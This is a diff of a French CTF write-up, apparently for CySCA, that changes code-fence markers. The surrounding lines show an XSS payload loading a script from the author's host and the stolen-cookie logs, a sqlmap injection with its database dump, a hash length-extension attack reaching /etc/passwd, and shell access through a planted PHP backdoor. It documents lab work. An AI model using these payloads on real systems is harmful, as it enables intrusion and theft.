@@ -50,7 +50,7 @@ En suivant les pages du site cela m'a permis d'énumérer des utilisateurs possi
 
 J'ai aussi remarqué que l'accès à la page de déconnexion provoque (même si l'on n'est pas connecté) les changements suivants sur les cookies :  
 
-```plain
+```
 Set-Cookie:user=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
 Set-Cookie:remember=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
 Set-Cookie:activity=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
@@ -68,7 +68,7 @@ Le mécanisme de commentaires en bas de chaque article permet d'envoyer des comm
 
 Le mécanisme BBcode-like nous permet de passer outre le filtrage des caractères. Ainsi j'ai pu poster le commentaire suivant :  
 
-```plain
+```
 [<script src=http://192.168.1.3/test.js></script>](test)
 ```
 
@@ -82,7 +82,7 @@ document.body.appendChild(image);
 
 Un navigateur moderne bloquerait sans doute l'utilisation de *document.cookie* dans un cas comme celui-ci mais ici j'ai rapidement reçu des lignes de ce type dans les logs de mon serveur *Apache* :  
 
-```plain
+```
 "GET /PHPSESSID=64pcr2a2hd583eqg579gpvrcs4;%20vip=0 HTTP/1.1" 403 - "http://localhost/blog.php?view=2" "
 Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.7 Safari/534.34"
 ```
@@ -100,7 +100,7 @@ La mission : récupérer le flag stocké dans la base de données.
 
 Quand on est connecté en tant que *Sycamore* on remarque une icône de poubelle à côté de chaque commentaire. Quand on affiche le code HTML on voit que le mécanisme de suppression se fait via une requête vers *deletecomment.php* utilisant *jQuery* :  
 
-```plain
+```
 window.csrf = '27fb15c0f098a858';
 function deletecomment(obj, id) {
   $.post('/deletecomment.php', {csrf: window.csrf, comment_id: id}).done(function(data) {
@@ -183,7 +183,7 @@ Le proxy récupère aussi la réponse du serveur cible car lors d'une requête d
 
 Il est alors possible de lancer *sqlmap* en le faisant parler à notre proxy :  
 
-```plain
+```
 ./sqlmap.py -u http://192.168.1.64/deletecomment.php  --data="comment_id=*&csrf=plop" --proxy=http://127.0.0.1:3128/
 
     sqlmap/1.0-dev - automatic SQL injection and database takeover tool
@@ -229,7 +229,7 @@ Une fois que *sqlmap* a détecté la méthode d'injection il suffit de le relanc
 
 On obtient alors les informations suivantes (en vrac) :  
 
-```plain
+```
 current database:    'cysca'
 current user:    'cysca@localhost'
 
@@ -279,7 +279,7 @@ On a tout de même récupéré une information essentielle dans la précédente 
 
 Les requêtes de modification sur l'API doivent être signées de cette façon :  
 
-```plain
+```
 All API calls using an authentication token must be signed and contain a X-Auth header with your api_key e.g. X-Auth: <api_key>.
 This will include all calls that modify content i.e. POST/PUT/DELETE methods.
 
@@ -321,7 +321,7 @@ Pour le premier problème j'ai eu recours à l'outil *hash\_extender* de *SkullS
 
 Voici un exemple d'utilisation :  
 
-```plain
+```
 $ ./hash_extender -d contenttypeapplication/pdffilepath./documents/Top_4_Mitigations.pdf -s 235aca08775a2070642013200d70097a -f md5 -a /../../../../../../../etc/passwd -l 16
 Type: md5
 Secret length: 16
@@ -434,7 +434,7 @@ print r.content
 
 Le script utilise l'API en POST permettant de rendre public un document déjà présent sur le serveur. On utilise le script de cette façon :  
 
-```plain
+```
 $ python arg_ownhash.py index.php
 contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%02%00%00%00%00%00%00&filepath=index.php&api_sig=529d58265e28414a5f5095c253ea5e31
 {"id":"4","uri":"\/api\/documents\/id\/4"}
@@ -630,7 +630,7 @@ Et cela... n'a pas fonctionné car */var/www* ne correspondait finalement pas au
 
 Avec la backdoor PHP ainsi placée on pouvait alors facilement mettre en place un *tshd* et accéder ensuite au serveur :  
 
-```plain
+```
 $ ./tsh 192.168.1.64
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
